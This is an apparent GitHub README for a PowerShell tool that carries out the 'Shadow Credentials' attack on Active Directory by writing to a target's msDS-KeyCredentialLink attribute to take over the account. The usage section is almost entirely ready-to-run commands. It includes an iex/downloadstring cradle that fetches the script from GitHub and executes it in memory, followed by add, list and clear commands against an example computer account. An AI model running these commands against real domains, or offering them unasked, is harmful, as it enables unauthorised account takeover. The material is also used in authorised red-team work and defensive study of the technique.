# KeyCredentialLink
Add Shadow Credentials to a target object by editing their msDS-KeyCredentialLink attribute

This tool is heavily inspired to [Whisker](https://github.com/eladshamir/Whisker) by Elad Shamir ([@elad_shamir](https://twitter.com/elad_shamir)).

This tool is based on code from [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) by Michael Grafnetter ([@MGrafnetter](https://twitter.com/MGrafnetter)).

For this attack to succeed, the environment must have a Domain Controller running at least Windows Server 2016, and the Domain Controller must have a server authentication certificate to allow for PKINIT Kerberos authentication.

Also, you need the necessary rights to edit the msDS-KeyCredentialLink attribute of the specified target.

More details are available at the post [Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).

## Usage
### Load the tool in memory
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/KeyCredentialLink/main/KeyCredentialLink.ps1')
```

### List all the values of the the msDS-KeyCredentialLink attribute of a target object
```
List-KeyCredentials -target "ABUSECOMP$" -domain "ferrari.local" -dc "dc01.ferrari.local"
```

### Add a new value to the msDS-KeyCredentialLink attribute of a target object
```
Add-KeyCredentials -target "ABUSECOMP$" -domain "ferrari.local" -dc "dc01.ferrari.local"
```

### Remove a value from the msDS-KeyCredentialLink attribute of a target object
```
Clear-KeyCredentials -target "ABUSECOMP$" -domain "ferrari.local" -dc "dc01.ferrari.local" -deviceId "<deviceID>"
```

### Clear all the values of the the msDS-KeyCredentialLink attribute of a target object
```
Clear-KeyCredentials -target "ABUSECOMP$" -domain "ferrari.local" -dc "dc01.ferrari.local" -Force
```
⚠️ Warning: Clearing all keys from msDS-KeyCredentialLink is a risky operation, as it will break legitimate passwordless authentication.

![KeyCred](https://github.com/Leo4j/KeyCredentialLink/assets/61951374/ac20fa27-80db-4bc7-a73f-ae265ea7cb0e)


